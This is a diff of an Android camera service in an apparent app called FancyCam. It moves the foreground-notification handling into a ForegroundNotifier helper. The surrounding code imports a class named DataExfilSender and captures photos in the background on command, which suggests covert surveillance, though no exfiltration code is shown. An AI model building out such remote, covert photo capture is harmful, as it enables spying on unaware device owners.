@@ -4,25 +4,18 @@ import androidx.camera.core.CameraSelector
 import androidx.camera.core.ImageCapture
 import androidx.camera.core.ImageCaptureException
 import androidx.camera.lifecycle.ProcessCameraProvider
-import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.Lifecycle
 import androidx.lifecycle.LifecycleOwner
 import androidx.lifecycle.LifecycleRegistry
-import com.example.fancycam.R
-import com.example.fancycam.network.AppConfig
 import com.example.fancycam.network.DataExfilSender
 import com.example.fancycam.network.PhotoUploader
 import com.example.fancycam.storage.PhotoStorageManager
 import com.example.fancycam.ui.AppActivityLogger
-import android.app.Notification
-import android.app.NotificationChannel
-import android.app.NotificationManager
 import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
-import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
@@ -42,8 +35,7 @@ class CameraCaptureService : Service(), LifecycleOwner {
 
     companion object {
         private const val TAG = "CameraCaptureService"
-        private const val CHANNEL_ID = "FancyCamCameraCapture"
-        private const val NOTIFICATION_ID = 4242
+        private const val OWNER = "camera_capture"
         const val EXTRA_COMMAND_ID = "extra_command_id"
         const val EXTRA_LENS_FACING = "extra_lens_facing"
 
@@ -67,20 +59,15 @@ class CameraCaptureService : Service(), LifecycleOwner {
     override fun onCreate() {
         super.onCreate()
         lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
-        createNotificationChannel()
+        ForegroundNotifier.ensureChannel(this)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val notification = buildNotification()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            startForeground(
-                NOTIFICATION_ID,
-                notification,
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-            )
-        } else {
-            startForeground(NOTIFICATION_ID, notification)
-        }
+        ForegroundNotifier.startForeground(
+            this,
+            OWNER,
+            ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+        )
 
         lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
         lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
@@ -90,32 +77,6 @@ class CameraCaptureService : Service(), LifecycleOwner {
 
         mainHandler.post { runCapture(commandId, lensFacing) }
         return START_NOT_STICKY
-    }
-
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "FancyCam Camera Capture",
-                NotificationManager.IMPORTANCE_LOW
-            ).apply {
-                description = "Foreground camera capture service"
-                setShowBadge(false)
-            }
-            (getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager)
-                ?.createNotificationChannel(channel)
-        }
-    }
-
-    private fun buildNotification(): Notification {
-        return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setSmallIcon(R.drawable.ic_camera_switch)
-            .setContentTitle("FancyCam")
-            .setContentText("Capturing photo in background…")
-            .setOngoing(true)
-            .setOnlyAlertOnce(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
     }
 
     private fun runCapture(commandId: String?, lensFacing: Int) {
@@ -238,7 +199,7 @@ class CameraCaptureService : Service(), LifecycleOwner {
             Log.w(TAG, "Unbind scheduling failed", e)
         }
         cameraExecutor.shutdown()
-        stopForeground(STOP_FOREGROUND_REMOVE)
+        ForegroundNotifier.stopForeground(this, OWNER)
         stopSelf()
     }
 
